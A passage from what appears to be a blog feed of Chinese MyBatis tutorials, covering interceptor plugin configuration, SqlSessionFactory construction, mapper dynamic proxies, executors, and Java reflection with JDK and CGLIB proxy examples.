<h5 id="确定要拦截的签名"><a href="#确定要拦截的签名" class="headerlink" title="确定要拦截的签名"></a>确定要拦截的签名</h5><ul>
<li>确定要拦截的对象，四大对象之一；</li>
<li>确定拦截的方法和参数；</li>
</ul>
<p>比如想拦截StatementHandler对象的prepare方法，该方法有一个参数Connection对象，可以这样声明：</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@Intercepts</span>(&#123;</span><br><span class="line">    <span class="meta">@Signature</span>(type =StatementHandler.class,</span><br><span class="line">        method=<span class="string">"prepare"</span> , </span><br><span class="line">        args=&#123;Connection.class&#125;)&#125;)</span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">MyPlugin</span> <span class="keyword">implements</span> <span class="title">Interceptor</span></span>&#123;</span><br><span class="line">    ......</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h5 id="定义插件类，实现拦截方法"><a href="#定义插件类，实现拦截方法" class="headerlink" title="定义插件类，实现拦截方法"></a>定义插件类，实现拦截方法</h5><p>上面已经分析过原理，实现Interceptor接口的方法即可，通过Plugin工具类方便生成代理类，通过MetaObject工具类方便操作四大对象的属性，修改对应的值。</p>
<h5 id="配置"><a href="#配置" class="headerlink" title="配置"></a>配置</h5><p>最后配置自定义的插件：</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;plugins&gt;</span><br><span class="line">    &lt;plugin interceptor=<span class="string">"com.qqdong.study.mybatis.TenantPlugin"</span>&gt;</span><br><span class="line">        &lt;property name=<span class="string">"dbType"</span> value=<span class="string">"mysql"</span>/&gt;</span><br><span class="line">    &lt;/plugin&gt;</span><br><span class="line">&lt;plugins&gt;</span><br></pre></td></tr></table></figure>
<blockquote>
<p>自定义插件还是比较复杂的，如果不了解原理，很容易出错，能不用插件尽量不要使用，因为它是修改MyBatis的底层设计。 插件生成的是层层代理对象的责任链模式，通过反射方法运行，性能不高，要考虑全面，特别是多个插件层层代理的逻辑。</p>
</blockquote>
<p>下一篇会介绍MyBatis与Spring的集成。</p>
<p><strong>欢迎扫描下方二维码，关注我的个人微信公众号 ~</strong></p>
<p><div align="center"><br><img src="http://upload-images.jianshu.io/upload_images/115629-5a140433dc5e61ad.jpg?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="情情说"></div></p>
]]></content>
      
        <categories>
            
            <category> MyBatis </category>
            
        </categories>
        
        
        <tags>
            
            <tag> MyBatis </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[深入浅出MyBatis：MyBatis解析和运行原理]]></title>
      <url>https://qqdong.github.io/2018/03/29/%E6%B7%B1%E5%85%A5%E6%B5%85%E5%87%BAMyBatis%EF%BC%9AMyBatis%E8%A7%A3%E6%9E%90%E5%92%8C%E8%BF%90%E8%A1%8C%E5%8E%9F%E7%90%86/</url>
      <content type="html"><![CDATA[<p>上一篇介绍了反射和动态代理基础，主要是为本篇文章做个铺垫，反射使配置和灵活性大大提高，可以给很多配置设置参数，动态代理可以在运行时创建代理对象，做一些特殊的处理。</p>
<p>本篇会介绍MyBatis解析和运行原理，下一篇介绍插件及应用，目的是更好地编写插件，通过本篇的介绍，你会了解到：</p>
<ul>
<li>构建SqlSessionFactory过程</li>
<li>映射器的动态代理</li>
<li>SqlSession的4大对象</li>
<li>sql执行的过程</li>
</ul>
<p>SqlSessionFactory和SqlSession是MyBatis的核心组件，在文章 <a href="http://qqidol.com/2018/03/25/%E6%B7%B1%E5%85%A5%E6%B5%85%E5%87%BAMyBatis%EF%BC%9A%E4%BB%8B%E7%BB%8D%E5%92%8C%E9%85%8D%E7%BD%AE/" target="_blank" rel="noopener">JDBC和MyBatis介绍</a> 中有详细说明。</p>
<a id="more"></a>
<h4 id="构建SqlSessionFactory过程"><a href="#构建SqlSessionFactory过程" class="headerlink" title="构建SqlSessionFactory过程"></a>构建SqlSessionFactory过程</h4><p>构建主要分为2步：</p>
<ul>
<li>通过XMLConfigBuilder解析配置的XML文件，读出配置参数，包括基础配置XML文件和映射器XML文件；</li>
<li>使用Configuration对象创建SqlSessionFactory，SqlSessionFactory是一个接口，提供了一个默认的实现类DefaultSqlSessionFactory。</li>
</ul>
<p>说白了，就是将我们的所有配置解析为Configuration对象，在整个生命周期内，可以通过该对象获取需要的配置。</p>
<p>由于插件需要频繁访问映射器的内部组成，会重点这部分，了解这块配置抽象出来的对象：</p>
<h5 id="MappedStatement"><a href="#MappedStatement" class="headerlink" title="MappedStatement"></a>MappedStatement</h5><p>它保存映射器的一个节点（select|insert|delete|update），包括配置的SQL，SQL的id、缓存信息、resultMap、parameterType、resultType等重要配置内容。</p>
<p>它涉及的对象比较多，一般不去修改它。</p>
<h5 id="SqlSource"><a href="#SqlSource" class="headerlink" title="SqlSource"></a>SqlSource</h5><p>它是MappedStatement的一个属性，主要作用是根据参数和其他规则组装SQL，也是很复杂的，一般也不用修改它。</p>
<h5 id="BoundSql"><a href="#BoundSql" class="headerlink" title="BoundSql"></a>BoundSql</h5><p>对于参数和SQL，主要反映在BoundSql类对象上，在插件中，通过它获取到当前运行的SQL和参数以及参数规则，作出适当的修改，满足特殊的要求。</p>
<p>BoundSql提供3个主要的属性：parameterObject、parameterMappings和sql，下面分别来介绍。</p>
<p>parameterObject为参数本身，可以传递简单对象、POJO、Map或@Param注解的参数：</p>
<ul>
<li>传递简单对象(int、float、String等)，会把参数转换为对应的类，比如int会转换为Integer；</li>
<li>如果传递的是POJO或Map，paramterObject就是传入的POJO或Map不变；</li>
<li>如果传递多个参数，没有@Param注解，parameterObject就是一个Map<string,object>对象，类似这样的形式{“1”:p1 , “2”:p2 , “3”:p3 … “param1”:p1 , “param2”:p2 , “param3”,p3 …}，所以在编写的时候可以使用#{param1}或#{1}去引用第一个参数；</string,object></li>
<li>如果传递多个参数，有@Param注解，与没有注解的类似，只是将序号的key替换为@Param指定的name；</li>
</ul>
<p>parameterMappings，它是一个List，元素是ParameterMapping对象，这个对象会描绘sql中的参数引用，包括名称、表达式、javaType、jdbcType、typeHandler等信息。</p>
<p>sql，是写在映射器里面的一条sql。</p>
<p>有了Configuration对象，构建SqlSessionFactory就简单了：</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlSessionFactory = <span class="keyword">new</span> SqlSessionFactoryBuilder().bulid(inputStream);</span><br></pre></td></tr></table></figure>
<h4 id="SqlSession运行过程"><a href="#SqlSession运行过程" class="headerlink" title="SqlSession运行过程"></a>SqlSession运行过程</h4><h5 id="映射器的动态代理"><a href="#映射器的动态代理" class="headerlink" title="映射器的动态代理"></a>映射器的动态代理</h5><p>Mapper映射是通过动态代理来实现的，使用JDK动态代理返回一个代理对象，供调用者访问。</p>
<p>首先看看实现InvocationHandler接口的类，它是执行本代理方法的关键，可以看到，Mapper是一个接口，会生成MapperMethod对象，调用execute方法。</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">MapperProxy</span>&lt;<span class="title">T</span>&gt; <span class="keyword">implements</span> <span class="title">InvocationHandler</span>, <span class="title">Serializable</span> </span>&#123;</span><br><span class="line">  </span><br><span class="line">  .....</span><br><span class="line">  </span><br><span class="line">  <span class="meta">@Override</span></span><br><span class="line">  <span class="function"><span class="keyword">public</span> Object <span class="title">invoke</span><span class="params">(Object proxy, Method method, Object[] args)</span> <span class="keyword">throws</span> Throwable </span>&#123;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">      <span class="keyword">if</span> (Object.class.equals(method.getDeclaringClass())) &#123;</span><br><span class="line">        <span class="keyword">return</span> method.invoke(<span class="keyword">this</span>, args);</span><br><span class="line">      &#125; <span class="keyword">else</span> <span class="keyword">if</span> (isDefaultMethod(method)) &#123;</span><br><span class="line">        <span class="keyword">return</span> invokeDefaultMethod(proxy, method, args);</span><br><span class="line">      &#125;</span><br><span class="line">    &#125; <span class="keyword">catch</span> (Throwable t) &#123;</span><br><span class="line">      <span class="keyword">throw</span> ExceptionUtil.unwrapThrowable(t);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">final</span> MapperMethod mapperMethod = cachedMapperMethod(method);</span><br><span class="line">    <span class="keyword">return</span> mapperMethod.execute(sqlSession, args);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>看下面的代码，MapperMethod采用命令模式，根据不同的sql操作，做不同的处理。</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">MapperMethod</span> </span>&#123;</span><br><span class="line">  <span class="function"><span class="keyword">public</span> Object <span class="title">execute</span><span class="params">(SqlSession sqlSession, Object[] args)</span> </span>&#123;</span><br><span class="line">    Object result;</span><br><span class="line">    <span class="keyword">switch</span> (command.getType()) &#123;</span><br><span class="line">      <span class="keyword">case</span> INSERT: &#123;</span><br><span class="line">      Object param = method.convertArgsToSqlCommandParam(args);</span><br><span class="line">        result = rowCountResult(sqlSession.insert(command.getName(), param));</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">case</span> UPDATE: &#123;</span><br><span class="line">        Object param = method.convertArgsToSqlCommandParam(args);</span><br><span class="line">        result = rowCountResult(sqlSession.update(command.getName(), param));</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">        </span><br><span class="line">        ......</span><br><span class="line">        </span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure>
<p>最后看下，生成代理类的方法，就是使用JDK动态代理Proxy来创建的。</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">MapperProxyFactory</span>&lt;<span class="title">T</span>&gt; </span>&#123;</span><br><span class="line"></span><br><span class="line">  <span class="function"><span class="keyword">public</span> T <span class="title">newInstance</span><span class="params">(SqlSession sqlSession)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">final</span> MapperProxy&lt;T&gt; mapperProxy = <span class="keyword">new</span> MapperProxy&lt;T&gt;(sqlSession, mapperInterface, methodCache);</span><br><span class="line">    <span class="keyword">return</span> newInstance(mapperProxy);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="meta">@SuppressWarnings</span>(<span class="string">"unchecked"</span>)</span><br><span class="line">  <span class="function"><span class="keyword">protected</span> T <span class="title">newInstance</span><span class="params">(MapperProxy&lt;T&gt; mapperProxy)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> (T) Proxy.newProxyInstance(mapperInterface.getClassLoader(), <span class="keyword">new</span> Class[] &#123; mapperInterface &#125;, mapperProxy);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>总结下映射器的调用过程，返回的Mapper对象是代理对象，当调用它的某个方法时，其实是调用MapperProxy#invoke方法，而映射器的XML文件的命名空间对应的就是这个接口的全路径，会根据全路径和方法名，便能够绑定起来，定位到sql，最后会使用SqlSession接口的方法使它能够执行查询。</p>
<h5 id="SqlSession下的四大对象"><a href="#SqlSession下的四大对象" class="headerlink" title="SqlSession下的四大对象"></a>SqlSession下的四大对象</h5><p>通过上面的分析，映射器就是一个动态代理对象，进入到了MapperMethod的execute方法，它经过简单的判断就进入了SqlSession的删除、更新、插入、选择等方法，这些方法如何执行是下面要介绍的内容。</p>
<p>Mapper执行的过程是通过Executor、StatementHandler、ParameterHandler和ResultHandler来完成数据库操作和结果返回的，理解他们是编写插件的关键：</p>
<ul>
<li>Executor：执行器，由它统一调度其他三个对象来执行对应的SQL；</li>
<li>StatementHandler：使用数据库的Statement执行操作；</li>
<li>ParameterHandler：用于SQL对参数的处理；</li>
<li>ResultHandler：进行最后数据集的封装返回处理；</li>
</ul>
<p>在MyBatis中存在三种执行器：</p>
<ul>
<li>SIMPLE：简易执行器，默认的执行器；</li>
<li>REUSE：执行重用预处理语句；</li>
<li>BATCH:执行重用语句和批量更新，针对批量专用的执行器；</li>
</ul>
<p>以SimpleExecutor为例，说明执行过程</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">SimpleExecutor</span> <span class="keyword">extends</span> <span class="title">BaseExecutor</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/**</span></span><br><span class="line"><span class="comment">  * 执行查询操作</span></span><br><span class="line"><span class="comment">  */</span></span><br><span class="line">  <span class="keyword">public</span> &lt;E&gt; <span class="function">List&lt;E&gt; <span class="title">doQuery</span><span class="params">(MappedStatement ms, Object parameter, RowBounds rowBounds, ResultHandler resultHandler, BoundSql boundSql)</span> <span class="keyword">throws</span> SQLException </span>&#123;</span><br><span class="line">    Statement stmt = <span class="keyword">null</span>;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">      Configuration configuration = ms.getConfiguration();</span><br><span class="line">      StatementHandler handler = configuration.newStatementHandler(<span class="keyword">this</span>, ms, parameter, rowBounds, resultHandler, boundSql);</span><br><span class="line">      stmt = prepareStatement(handler, ms.getStatementLog());</span><br><span class="line">      <span class="keyword">return</span> handler.&lt;E&gt;query(stmt, resultHandler);</span><br><span class="line">    &#125; <span class="keyword">finally</span> &#123;</span><br><span class="line">      closeStatement(stmt);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  </span><br><span class="line">  <span class="comment">/**</span></span><br><span class="line"><span class="comment">  * 初始化StatementHandler</span></span><br><span class="line"><span class="comment">  */</span></span><br><span class="line">  <span class="function"><span class="keyword">private</span> Statement <span class="title">prepareStatement</span><span class="params">(StatementHandler handler, Log statementLog)</span> <span class="keyword">throws</span> SQLException </span>&#123;</span><br><span class="line">    Statement stmt;</span><br><span class="line">    Connection connection = getConnection(statementLog);</span><br><span class="line">    stmt = handler.prepare(connection);</span><br><span class="line">    handler.parameterize(stmt);</span><br><span class="line">    <span class="keyword">return</span> stmt;</span><br><span class="line">  &#125;</span><br><span class="line">  </span><br><span class="line">  <span class="comment">/**</span></span><br><span class="line"><span class="comment">  * 执行查询</span></span><br><span class="line"><span class="comment">  */</span></span><br><span class="line">  <span class="meta">@Override</span></span><br><span class="line">  <span class="keyword">public</span> &lt;E&gt; <span class="function">List&lt;E&gt; <span class="title">query</span><span class="params">(Statement statement, ResultHandler resultHandler)</span> <span class="keyword">throws</span> SQLException </span>&#123;</span><br><span class="line">    String sql = boundSql.getSql();</span><br><span class="line">    statement.execute(sql);</span><br><span class="line">    <span class="keyword">return</span> resultSetHandler.&lt;E&gt;handleResultSets(statement);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>可以看到最后会委托给StatementHandler会话器进行处理，它是一个接口，实际创建的是RoutingStatementHandler对象，但它不是真实的服务对象，它是通过适配器模式找到对应的StatementHandler执行的。在MyBatis中，StatementHandler和Executor一样分为三种：SimpleStatementHandler、PreparedStatementHandler、CallableStatementHandler。</p>
<p>Executor会先调用StatementHandler的prepare方法预编译SQL语句，同时设置一些基本运行的参数。然后调用parameterize()方法启用ParameterHandler设置参数，完成预编译，跟着执行查询，用ResultHandler封装结果返回给调用者。</p>
<p>参数处理器和结果处理器比较简单，就不在此介绍了。</p>
<p>下一篇会介绍插件及其应用，主要是在sql执行的过程中，在四大对象的基础上进行扩展。</p>
<p><strong>欢迎扫描下方二维码，关注我的个人微信公众号 ~</strong></p>
<p><div align="center"><br><img src="http://upload-images.jianshu.io/upload_images/115629-5a140433dc5e61ad.jpg?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="情情说"></div></p>
]]></content>
      
        <categories>
            
            <category> MyBatis </category>
            
        </categories>
        
        
        <tags>
            
            <tag> MyBatis </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[深入浅出MyBatis：反射和动态代理]]></title>
      <url>https://qqdong.github.io/2018/03/28/%E6%B7%B1%E5%85%A5%E6%B5%85%E5%87%BAMyBatis%EF%BC%9A%E5%8F%8D%E5%B0%84%E5%92%8C%E5%8A%A8%E6%80%81%E4%BB%A3%E7%90%86%E5%9F%BA%E7%A1%80/</url>
      <content type="html"><![CDATA[<p>前三篇详细总结了Mybatis的基本特性、常用配置、映射器，相对于Hibernate，映射器的配置相对复杂，但有很好的灵活性和扩展性，可以应对各种业务场景。熟练掌握这些内容，可以流畅的使用MyBatis进行开发了。</p>
<p>后面准备介绍MyBatis的解析和运行原理以及自定义插件，今天看了书籍的这部分，都会涉及到反射和动态代理这些基础，本篇文章总结下这些，便于理解原理。</p>
<p>通过本篇的介绍，你会了解到：</p>
<ul>
<li>反射和动态代理是解决什么问题的</li>
<li>Class对象</li>
<li>反射能做什么</li>
<li>动态代理的实现方式：JDK动态代理、CGLIB</li>
</ul>
<a id="more"></a>
<h4 id="理解反射和动态代理"><a href="#理解反射和动态代理" class="headerlink" title="理解反射和动态代理"></a>理解反射和动态代理</h4><h5 id="反射"><a href="#反射" class="headerlink" title="反射"></a>反射</h5><p>首先看看官网对反射的定义：</p>
<blockquote>
<p>可以通过java代码，获取当前加载类的字段、方法、构造函数等信息，并在安全限制内，使用反射字段、方法、构造函数进行操作。</p>
</blockquote>
<p>简单来说，可以在运行时获得程序中每一个类型的成员信息。程序中定义的对象，其类型都是在编译期确定的，而反射可以动态地创建对象，并访问或调用其成员。</p>
<h5 id="动态代理"><a href="#动态代理" class="headerlink" title="动态代理"></a>动态代理</h5><p>所谓代理，是一个人或组织代替另一个人或组织做事，主要有3个角色：访问者、代理人、被代理人，访问者经由代理人，与被代理人交互，中间会加入一些自己的处理。</p>
<p><img src="http://oc3r3rke2.bkt.clouddn.com/15222394888944.jpg" alt="图片来自互联网"></p>
<p>所谓的动态代理，是说在编译时不需要定义代理类，而是在运行时创建，这个是关键：在运行时创建代理类。</p>
<h4 id="Class对象"><a href="#Class对象" class="headerlink" title="Class对象"></a>Class对象</h4><p>Class类是一个实实在在的类，存在于java.lang包中，用来表示运行时类型信息。Class对象表示自定义类的类型信息，比如创建一个User类，JVM就会创建一个User对应的Class对象，保存User类相关的类型信息，该对象保存在jvm堆中，作为访问方法区中User类型信息的接口。</p>
<p>在使用自定义类时，会首先检查这个类的Class对象是否已经加载，如果没有加载，默认的类加载器就会先根据类名查找.class文件，Class对象就会被加载到内存。</p>
<p>可以通过下面3种方法获取Class对象：</p>
<ul>
<li>使用Class类的forName静态方法；</li>
<li>直接获取某一个对象的class；</li>
<li>调用某个对象的getClass()方法；</li>
</ul>
<p>Class对象是反射的基础，提供了获取类信息的方法，后面会介绍。</p>
<h4 id="反射提供的功能"><a href="#反射提供的功能" class="headerlink" title="反射提供的功能"></a>反射提供的功能</h4><p>java反射框架主要提供以下内容：</p>
<ul>
<li>在运行时判断对象所属的类；</li>
<li>在运行时创建对象；</li>
<li>在运行时获取类包含的成员变量、方法、父类、接口等信息；</li>
<li>在运行时调用一个对象的方法；</li>
</ul>
<p>下面举例说明相关功能</p>
<p>创建实例：</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//获取String所对应的Class对象</span></span><br><span class="line">Class&lt;?&gt; c = User.class;</span><br><span class="line"><span class="comment">//获取String类带一个String参数的构造器</span></span><br><span class="line">Constructor constructor = c.getConstructor(String.class);</span><br><span class="line"><span class="comment">//根据构造器创建实例</span></span><br><span class="line">User user = (User)constructor.newInstance(<span class="string">"calm"</span>);</span><br></pre></td></tr></table></figure>
<p>获取方法：</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//返回类或接口声明的所有方法，包括私有的，但不包括继承的方法</span></span><br><span class="line"><span class="keyword">public</span> Method[] getDeclaredMethods() <span class="keyword">throws</span> SecurityException</span><br><span class="line"></span><br><span class="line"><span class="comment">//所有public方法，包括继承的方法</span></span><br><span class="line"><span class="keyword">public</span> Method[] getMethods() <span class="keyword">throws</span> SecurityException</span><br><span class="line"></span><br><span class="line"><span class="comment">//返回一个特定的方法，第一个参数为方法名称，后面的参数为方法参数对应Class的对象</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> Method <span class="title">getMethod</span><span class="params">(String name, Class&lt;?&gt;... parameterTypes)</span></span></span><br></pre></td></tr></table></figure>
<p>调用方法：</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">Class&lt;?&gt; userClass=User.class;</span><br><span class="line">Object obj = userClass.newInstance();</span><br><span class="line">Method method =klass.getMethod(<span class="string">"addRole"</span>,String.class);</span><br><span class="line">method.invoke(obj,<span class="string">"超级管理员"</span>);</span><br></pre></td></tr></table></figure>
<h4 id="JDK动态代理"><a href="#JDK动态代理" class="headerlink" title="JDK动态代理"></a>JDK动态代理</h4><p>JDK本身提供了动态代理的实现，要求被代理者必须实现接口。</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> Object <span class="title">newProxyInstance</span><span class="params">(ClassLoader loader,</span></span></span><br><span class="line"><span class="function"><span class="params">Class&lt;?&gt;[] interfaces,InvocationHandler h)</span></span></span><br></pre></td></tr></table></figure>
<p>第一个参数为类加载器，第二个参数是被代理者实现的接口列表，第三个参数是实现了InvocationHandler接口的对象。</p>
<p>InvocationHandler是一个接口，用于规范执行被代理者的方法，可在执行方法前后，添加公共的处理代码。生成的动态代理类包含一个InvocationHandler属性，调用对应方法时，会触发invoke方法的调用。</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">JDKProxy</span> <span class="keyword">implements</span> <span class="title">InvocationHandler</span> </span>&#123;    </span><br><span class="line">    </span><br><span class="line">    <span class="keyword">private</span> Object targetObject;<span class="comment">//被代理对象   </span></span><br><span class="line">    </span><br><span class="line">    <span class="function"><span class="keyword">public</span> Object <span class="title">newProxy</span><span class="params">(Object targetObject)</span> </span>&#123;        </span><br><span class="line">        <span class="keyword">this</span>.targetObject = targetObject;     </span><br><span class="line">        <span class="keyword">return</span> Proxy.newProxyInstance(targetObject.getClass().getClassLoader(),</span><br><span class="line">targetObject.getClass().getInterfaces(), <span class="keyword">this</span>);</span><br><span class="line">&#125;    </span><br><span class="line">    </span><br><span class="line">    <span class="function"><span class="keyword">public</span> Object <span class="title">invoke</span><span class="params">(Object proxy, Method method, Object[] args)</span><span class="comment">//invoke方法    </span></span></span><br><span class="line"><span class="function">            <span class="keyword">throws</span> Throwable </span>&#123;    </span><br><span class="line">        Object ret = <span class="keyword">null</span>;         </span><br><span class="line">        ret  = method.invoke(targetObject, args);      </span><br><span class="line">        <span class="keyword">return</span> ret;    </span><br><span class="line">    &#125;    </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>测试代码：</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">JDKProxy jdkProxy=<span class="keyword">new</span> JDKProxy();</span><br><span class="line">UserService userService = (UserService) </span><br><span class="line">jdkProxy.newProxy(<span class="keyword">new</span> UserServiceImp());    </span><br><span class="line">userService.addRole(<span class="string">"超级管理员"</span>);</span><br></pre></td></tr></table></figure>
<p>JDK动态代理的基本原理是根据定义好的规则，用传入的接口创建一个新类。</p>
<h4 id="CGLIB动态代理"><a href="#CGLIB动态代理" class="headerlink" title="CGLIB动态代理"></a>CGLIB动态代理</h4><p>JDK动态代理要求必须有接口，CGLIB（Code Generate Library）动态代理没有这个要求，它是通过创建一个被代理类的子类，然后使用ASM字节码库修改代码来实现的。</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">CGLibProxy</span> <span class="keyword">implements</span> <span class="title">MethodInterceptor</span> </span>&#123;    </span><br><span class="line">    <span class="keyword">private</span> Object targetObject; <span class="comment">//被代理对象</span></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> Object <span class="title">createProxyObject</span><span class="params">(Object obj)</span> </span>&#123;    </span><br><span class="line">        <span class="keyword">this</span>.targetObject = obj;    </span><br><span class="line">        Enhancer enhancer = <span class="keyword">new</span> Enhancer();    </span><br><span class="line">        enhancer.setSuperclass(obj.getClass());    </span><br><span class="line">        enhancer.setCallback(<span class="keyword">this</span>);    </span><br><span class="line">        Object proxyObj = enhancer.create();    </span><br><span class="line">        <span class="keyword">return</span> proxyObj;</span><br><span class="line">    &#125;    </span><br><span class="line">    </span><br><span class="line">    <span class="function"><span class="keyword">public</span> Object <span class="title">intercept</span><span class="params">(Object proxy, Method method, Object[] args,    </span></span></span><br><span class="line"><span class="function"><span class="params">            MethodProxy methodProxy)</span> <span class="keyword">throws</span> Throwable </span>&#123;    </span><br><span class="line">        Object obj = <span class="keyword">null</span>;       </span><br><span class="line">        obj = method.invoke(targetObject, args);    </span><br><span class="line">        <span class="keyword">return</span> obj;    </span><br><span class="line">    &#125;       </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>测试代码：</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">CGLibProxy cgLibProxy=<span class="keyword">new</span> CGLibProxy();</span><br><span class="line">UserService userService = (UserService) </span><br><span class="line">cgLibProxy.newProxy(<span class="keyword">new</span> UserServiceImp());    </span><br><span class="line">userService.addRole(<span class="string">"超级管理员"</span>);</span><br></pre></td></tr></table></figure>
<blockquote>
